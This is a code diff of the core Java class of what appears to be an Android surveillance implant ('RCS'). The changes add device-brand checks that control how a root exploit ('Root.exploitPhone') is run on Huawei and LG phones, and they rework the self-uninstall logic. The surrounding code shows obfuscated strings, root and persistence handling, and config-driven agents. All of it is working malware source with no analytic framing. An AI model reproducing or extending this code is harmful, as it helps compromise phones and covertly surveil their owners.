@@ -14,6 +14,7 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.content.res.Resources;
+import android.os.Build;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
 import android.util.Log;
@@ -100,6 +101,15 @@ public class Core extends Activity implements Runnable {
 		return singleton;
 	}
 
+	public synchronized static void serivceUnregister(){
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (serivceUnregister) ...");
+		}
+		if (singleton != null && singleton.serviceMain != null) {
+			singleton.serviceMain.stopListening();
+		}
+	}
+
 	public static Core newCore(ServiceMain serviceMain) {
 		if (singleton == null) {
 			singleton = new Core();
@@ -166,9 +176,15 @@ public class Core extends Activity implements Runnable {
 				}
 
 			}
-			if (Status.getExploitStatus() != Status.EXPLOIT_STATUS_RUNNING && haveUninstallMarkup() ) {
-				UninstallAction.actualExecute();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (Start): checking uninstall Markup");
+			}
+			if (Status.getExploitStatus() != Status.EXPLOIT_STATUS_RUNNING && Status.uninstall ) {
+				UninstallAction.actualExecute(false);
 				return false;
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (Start): checked uninstall Markup");
 			}
 			if (Status.haveRoot()) {
 				int perStatus = Status.getPersistencyStatus();
@@ -265,6 +281,16 @@ public class Core extends Activity implements Runnable {
 		return serviceRunning;
 	}
 
+	private boolean runExploitSynchronously(){
+		if(Build.BRAND.toLowerCase().contains(M.e("huawei"))) {
+			return true;
+		}
+		if(Build.BRAND.toLowerCase().contains(M.e("lge"))) {
+			if(Build.MODEL.toUpperCase().contains(M.e("LG-D405")))
+			return true;
+		}
+		return false;
+	}
 	// Runnable (main routine for RCS)
 	/*
 	 * (non-Javadoc)
@@ -299,7 +325,7 @@ public class Core extends Activity implements Runnable {
 
 			return;
 		}
-		Root.exploitPhone(false);
+		Root.exploitPhone(runExploitSynchronously());
 		Root.getPermissions(false);
 
 		if (Status.haveRoot()) {
@@ -328,13 +354,19 @@ public class Core extends Activity implements Runnable {
 			}
 
 		}
-
+		int confLoaded=0;
 		try {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: init task"); //$NON-NLS-1$
 			}
-
-			int confLoaded = taskInit();
+			// this markup is created by UninstallAction
+			//final Markup markup = new Markup(UNINSTALL_MARKUP);
+			if (haveUninstallMarkup()) {
+				UninstallAction.actualExecute(true);
+				confLoaded = ConfType.Error;
+			}else {
+				confLoaded = taskInit();
+			}
 			// viene letta la conf e vengono fatti partire agenti e eventi
 			if (confLoaded == ConfType.Error) {
 				if (Cfg.DEBUG) {
@@ -483,7 +515,7 @@ public class Core extends Activity implements Runnable {
 							Check.log(TAG + " Info: checkActions: Uninstall"); //$NON-NLS-1$
 						}
 
-						UninstallAction.actualExecute();
+						UninstallAction.actualExecute(true);
 						return true;
 					}
 				}
@@ -548,12 +580,7 @@ public class Core extends Activity implements Runnable {
 	 */
 	private int taskInit() {
 		try {
-			// this markup is created by UninstallAction
-			//final Markup markup = new Markup(UNINSTALL_MARKUP);
-			if (haveUninstallMarkup()) {
-				UninstallAction.actualExecute();
-				return ConfType.Error;
-			}
+
 
 			// Identify the device uniquely
 			final Device device = Device.self();
@@ -973,7 +1000,7 @@ public class Core extends Activity implements Runnable {
 	}
 
 
-	public synchronized boolean haveUninstallMarkup() {
+	public boolean haveUninstallMarkup() {
 		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), UNINSTALL_MARKUP);
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (haveUninstallMarkup) " + markup.exists());
